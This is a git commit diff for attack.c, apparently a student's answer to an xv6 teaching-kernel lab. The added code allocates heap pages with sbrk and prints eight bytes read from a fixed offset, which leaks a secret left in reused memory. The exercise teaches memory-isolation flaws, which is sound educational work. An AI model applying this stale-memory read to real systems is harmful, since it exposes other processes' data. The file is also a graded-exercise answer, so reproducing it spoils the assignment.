68f026a81f83e9808bea5007d3727cc42471891b
Sarthaki <sarthakibhoir1010@gmail.com>
2025-08-28 18:32:36 +0000

    Modified attack.c

--- syscall/user/attack.c
+++ syscall/user/attack.c
@@ -2,12 +2,12 @@
 #include "kernel/fcntl.h"
 #include "user/user.h"
 #include "kernel/riscv.h"
-
 int
 main(int argc, char *argv[])
 {
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
-
-  exit(1);
+int n_page=17;
+char  *mem=sbrk(n_page*PGSIZE);
+mem+=(n_page-1)*PGSIZE;
+write(2,mem+32,8);
+exit(1);
 }
